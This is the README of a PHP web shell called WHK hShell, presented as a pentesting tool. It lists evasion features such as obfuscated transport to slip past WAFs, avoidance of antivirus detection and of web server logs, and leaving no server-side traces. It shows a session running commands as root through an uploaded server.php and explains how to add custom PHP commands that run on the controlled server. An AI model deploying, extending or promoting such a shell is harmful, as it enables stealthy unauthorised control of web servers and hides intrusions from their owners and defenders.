# WHK hShell

Web-Shell for professional use as a pentester writed in <?php


## Advantage

- The core of the shell is on the client's side.
- It leaves no traces because the code is not stored on the server side.
- No server-side interventions are required to perform updates.
- Interpretable code sent from the client, this prevents the detection of the antivirus.
- Transport of obfuscated code for the prevention of WAF detection.
- The data transport uses HTTP / POST requests, prevents leaving traces in logs of WEB servers.
- Use random payload on the HTTP / POST body for prevention of WAF detection.
- Supports large amounts of code due to the sending of requests via multipart/form-data.


## How to use?

The php server script must be uploaded on the server to be controlled. Then you must run the client.php from the terminal and indicate the path of the server.php:

    whk@machine:~$ php client.php 
     -=[ Wellcome to H Shell ðŸ’€ v0.5 Alpha ]=-
    + Connect to url: https://whk.cl/server.php
    + Connecting ...
    + Connected!
    h-Shell:/home/whk.cl/public_html/> id
    uid=0(root) gid=0(root)
    hShell:/home/whk.cl/public_html/> exec ls -la
    total 1
    drwxrwxr-x.  5 whk.cl whk.cl  4096 Feb 10 17:33 .
    drwx------.  6 whk.cl whk.cl  4096 Oct  8 15:08 ..
    -rw-r--r--.  1 root   root    1388 Feb 10 21:38 server.php
    hShell:/home/whk.cl/public_html/> force-exec explicit ls -la
    total 1
    drwxrwxr-x.  5 whk.cl whk.cl  4096 Feb 10 17:33 .
    drwx------.  6 whk.cl whk.cl  4096 Oct  8 15:08 ..
    -rw-r--r--.  1 root   root    1388 Feb 10 21:38 server.php
    h-Shell:/home/whk.cl/public_html/> exit
    ! Bye.

## Execute own codes without modifying the server

You can create and execute your own codes made in PHP language by creating specific functions for it.

### Howto make a custom functions?

In the client.php make a specific conditional between:

    }
    else if(in_array($command, array('exit', 'quit')))
    {

For example:

    }
    else if(in_array($command, array('custom_command')))
    {
        $result = $this->sendBuffer('
            $result = "done!";
        ');
        
        if($echo)
        {
            echo $result."\n";
        }
        
        return $result;
    }
    else if(in_array($command, array('exit', 'quit')))
    {

Where `$result = "done!";` is your code that will run on the server. The `$result` is the variable for return the string of result to the client.

For large return messages use callbacks for prevent exhaust of memory on the client, example:

    }
    else if(in_array($command, array('custom_command')))
    {
        $result = $this->sendBuffer('
            for($i = 0; $i <= 50000; $i++)
            {
                echo 'FOO';
            }
        ', 'self::callbackCommandGenericFlush', true);
        echo "\n";
    }
    else if(in_array($command, array('exit', 'quit')))
    {

See the `', 'self::callbackCommandGenericFlush', true);` when `self::callbackCommandGenericFlush` is the callback for print each line in real time without keep the lines in a local variable. Note: the out of buffer is a raw `echo`, dont use `$return`.
For call your command only call this:

    hShell:/> custom_command

For arguments use `$argv`, is a array of arguments (separated by blank space). For join all arguments use `implde`, by example: `$argument = implode(' ', $argv)`.
